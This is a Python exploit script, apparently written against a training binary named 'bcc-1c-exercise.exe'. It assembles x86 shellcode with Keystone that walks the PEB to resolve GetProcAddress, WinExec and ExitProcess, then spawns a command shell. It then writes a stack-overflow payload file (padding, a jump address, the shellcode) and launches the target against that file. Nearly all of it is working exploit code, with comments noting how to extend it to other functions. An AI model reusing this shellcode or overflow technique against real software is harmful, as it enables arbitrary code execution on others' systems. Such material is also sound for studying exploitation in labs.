import os 
from keystone import *

# Uses PEB walking to get address of GetProcAddress function in kernel32.dll
# Use GetProcAddress to search for the function address of WinExec and ExitProcess (for graceful termination)
# More extensible as we can use GetProcAddress of find function address in any dll if required
# Uses WinExec to run "cmd.exe /c start cmd.exe" to spawn a new cmd terminal

CODE = b"""
    start:
        push eax
        push ebx 
        push ecx
        push edx
        push esi
        push edi
        push ebp

        push ebp
        mov ebp,esp
        sub esp, 0x40
        
        xor esi, esi
        push 0x41737373
        push 0x65726464
        push 0x41636F72
        push 0x50746547
        mov [ebp-0x4],esp

        xor esi,esi
        mov ebx, fs:[esi+0x30]
        mov ebx, [ebx + 0x0C] 
        mov ebx, [ebx + 0x14] 
        mov ebx, [ebx]	
        mov ebx, [ebx]	
        mov ebx, [ebx + 0x10]
        mov [ebp-0x8], ebx 

        mov eax, [ebx + 0x3C]		
        add eax, ebx       		
        mov eax, [eax + 0x78]	
        add eax, ebx 			

        mov ecx, [eax + 0x24]		
        add ecx, ebx 			
        mov [ebp-0xC], ecx 

        mov edi, [eax + 0x20] 		
        add edi, ebx 			
        mov [ebp-0x10], edi 		

        mov edx, [eax + 0x1C] 		
        add edx, ebx 		
        mov [ebp-0x14], edx 		

        mov edx, [eax + 0x14] 
        mov [ebp-0x18], edx

        xor eax, eax 

    search_loop:
        mov edi, [ebp-0x10]
        mov esi, [ebp-0x4C]
        xor ecx, ecx

        cld 
        mov edi, [edi+eax*4]
        add edi, ebx
        add cx, 8
        repe cmpsb

        jz found

        inc eax
        cmp eax, edx
        jb search_loop

        add esp, 0x26
        jmp end
    
    found:

        mov ecx, [ebp-0xC]
        mov edx, [ebp-0x14]

        mov ax, [ecx+eax*2]
        mov eax, [edx+eax*4]
        add eax, ebx
        mov [ebp-0x20], eax ;[ebp-0x20] -> GetProcAddress function address

        xor edx, edx
        mov edx, 0x11727469
        xor edx, 0x11111111
        push edx
        push 0x456e6957
        mov esi, esp
        push esi
        push dword ptr [ebp-0x8] ; kernel32.dll base address
        call eax        ; can set bp here and run `ln @eax` in WinDBG to check if the correct function is in eax
        mov [ebp-0x24], eax ; [ebp-0x24] -> WinExec function address
        
        xor eax, eax
        mov eax, 0x11626274
        xor eax, 0x11111111
        push eax
        xor eax, eax
        push 0x636f7250
        push 0x74697845
        mov esi, esp
        push esi
        push dword ptr [ebp-0x8] ; kernel32.dll base address
        call dword ptr [ebp-0x20] ; call GetProcAddress to get WinExec address
        mov [ebp-0x28], eax ; [ebp-0x28] -> address of the string "ExitProcess"
        
        xor edx, edx
        push edx
        push 0x6578652E
        push 0x646D6320
        push 0x74726174
        push 0x7320632F
        push 0x20657865
        push 0x2E646D63
        mov esi, esp
        push 10
        push esi
        call dword ptr [ebp-0x24] ; call WinExec

        xor edx, edx
        push edx
        call dword ptr [ebp-0x28] ; call ExitProcess
    end:
        pop ebp
        pop edi
        pop esi
        pop edx
        pop ecx
        pop ebx
        pop eax
        ret
    """

def gen_cyclic_bytes(req_len):
    chars=b'ABCDEFGHIJKLMNOPQRSTUVWXYZ'
    buffer = bytearray()
    byte_counter = 0
    index =0
    while byte_counter < req_len:
        for i in range(3):
            buffer.extend([chars[index%len(chars)]])
            byte_counter += 1
        buffer.extend([index])
        index +=1
    if len(buffer) > req_len:
        buffer = buffer[:req_len]
    return bytes(buffer)

def insert_string(offset, jmp_addr, ks_encoding, total_length):
    cyclic_pattern = gen_cyclic_bytes(total_length)

    part1 = cyclic_pattern[:offset]
    part2 = jmp_addr
    part3 = bytes(ks_encoding)

    remaining_length = total_length - offset - len(jmp_addr) - len(part3)
    
    if remaining_length <0:
        return part1+part2+part3

    part4 = b'\xcc' * remaining_length
    return part1+part2+part3+part4

# PARAMS
OFFSET_TARGET = 28
JMP_ADDRESS_STRING = '0x0BCC1AE9'
TOTAL_BUFFER_SIZE = 256
PAYLOAD_FILE = "c:\\programdata\\moocow.txt"

# generate shellcode
try:
    # initialize engine in x86-32bit mode
    print("Generating shellcode with keystone engine\n")
    ks = KS(KS_ARCH_X86, KS_MODE_32)
    encoding, count = ks.asm(CODE)
except KSError as e:
    print(f"Keystone engine error: {e}")
    exit()
    
asm_code = "".join(f"\\x{x:02x}" for x in encoding)
print("Shellcode generated:\n")
print(asm_code,'\n')

print(f'Crafting exploit payload file at: {PAYLOAD_FILE}\n')
with open(PAYLOAD_FILE, "wb") as f:
    f.write(insert_string(OFFSET_TARGET, int(JMP_ADDRESS_STRING, 16).to_bytes(4, 'little'), encoding, TOTAL_BUFFER_SIZE))

print("Launching Exploit\n")
launch = 'bcc-1c-exercise.exe c:\\programdata -f moocow.txt -s 0'
os.popen(launch)
